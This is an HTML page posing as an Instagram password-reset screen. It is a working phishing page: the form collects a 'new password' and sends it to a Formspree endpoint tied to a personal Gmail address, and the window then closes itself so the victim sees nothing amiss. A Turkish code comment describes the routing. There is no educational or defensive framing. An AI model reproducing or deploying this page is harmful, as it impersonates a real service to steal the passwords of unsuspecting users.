<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram - Reset Password</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            color: #fff;
            margin: 0;
        }
        .container {
            background: #121212;
            padding: 24px;
            border-radius: 10px;
            box-shadow: none;
            width: 90%;
            max-width: 360px;
            text-align: center;
        }
        h2 {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 8px;
        }
        p {
            font-size: 14px;
            color: #b3b3b3;
            margin-bottom: 16px;
        }
        input {
            background-color: #262626;
            color: #fff;
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #444;
            border-radius: 5px;
            font-size: 14px;
            display: block;
        }
        button {
            background-color: #3b5998;
            color: #fff;
            font-size: 14px;
            font-weight: bold;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #2a4373;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Create a Strong Password</h2>
        <p>Your password must be at least 6 characters long and include numbers, letters, and special characters (!@$%).</p>
        
        <!-- Form doğrudan Formspree API'ye yönlendirilerek çalışır -->
        <form action="https://formspree.io/f/mnqeyzln" method="POST" onsubmit="setTimeout(() => window.close(), 1000)">
            <input type="password" name="new_password" placeholder="New password" required>
            <input type="hidden" name="_replyto" value="qenes4444@gmail.com"> <!-- E-posta gönderilecek adres -->
            <button type="submit">Reset Password</button>
        </form>
    </div>
</body>
</html>
